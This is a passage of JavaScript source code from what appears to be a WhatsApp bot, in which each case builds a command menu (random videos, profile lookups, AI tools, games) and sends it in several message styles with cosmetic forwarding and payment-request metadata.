                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"قـائـمـة الاوامـر ⚡",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'randomvideomenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${xeonytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *🅞 = For Owner* 
├ *🅕 = For Free User*
├ *🅟 = For Premium User*
╰─┬────❍
╭─┴❍「 *Random Video* 」❍
│${setv} ${prefix}tiktokgirl 🅕
│${setv} ${prefix}tiktoknukthy 🅕
│${setv} ${prefix}tiktokkayes 🅕
│${setv} ${prefix}tiktokpanrika 🅕
│${setv} ${prefix}tiktoknotnot 🅕
│${setv} ${prefix}tiktokghea 🅕
│${setv} ${prefix}tiktoksantuy 🅕
│${setv} ${prefix}tiktokbocil 🅕
╰──────❍`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	XeonBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"قـائـمـة الاوامـر ⚡",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'stalkermenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${xeonytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *🅞 = For Owner* 
├ *🅕 = For Free User*
├ *🅟 = For Premium User*
╰─┬────❍
╭─┴❍「 *Stalker* 」❍
│${setv} ${prefix}tiktokstalk 🅕
│${setv} ${prefix}mlstalk 🅕
│${setv} ${prefix}npmstalk 🅕
│${setv} ${prefix}ghstalk 🅕
╰──────❍`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	XeonBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"قـائـمـة الاوامـر ⚡",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'aimenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${xeonytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *🅞 = For Owner* 
├ *🅕 = For Free User*
├ *🅟 = For Premium User*
╰─┬────❍
╭─┴❍「 *OpenAI* 」❍
│${setv} ${prefix}blackboxai 🅕
│${setv} ${prefix}travel-assistant 🅕
│${setv} ${prefix}guru-ai 🅕
│${setv} ${prefix}emi-ai 🅕
│${setv} ${prefix}claude-ai 🅕
│${setv} ${prefix}hercai-cartoon 🅕
│${setv} ${prefix}hercai-animefy 🅕
│${setv} ${prefix}hercai-lexica 🅕
│${setv} ${prefix}hercai-prodia 🅕
│${setv} ${prefix}hercai-simurg 🅕
│${setv} ${prefix}hercai-raava 🅕
│${setv} ${prefix}hercai-shonin 🅕
│${setv} ${prefix}realistic 🅕
│${setv} ${prefix}3dmodel 🅕
│${setv} ${prefix}photoleap 🅕
│${setv} ${prefix}openai 🅕
│${setv} ${prefix}dalle 🅕
│${setv} ${prefix}ai 🅕
│${setv} ${prefix}remini 🅕
╰──────❍`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	XeonBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"قـائـمـة الاوامـر ⚡",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'gamemenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${xeonytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *🅞 = For Owner* 
├ *🅕 = For Free User*
├ *🅟 = For Premium User*
╰─┬────❍
╭─┴❍「 *Game* 」❍
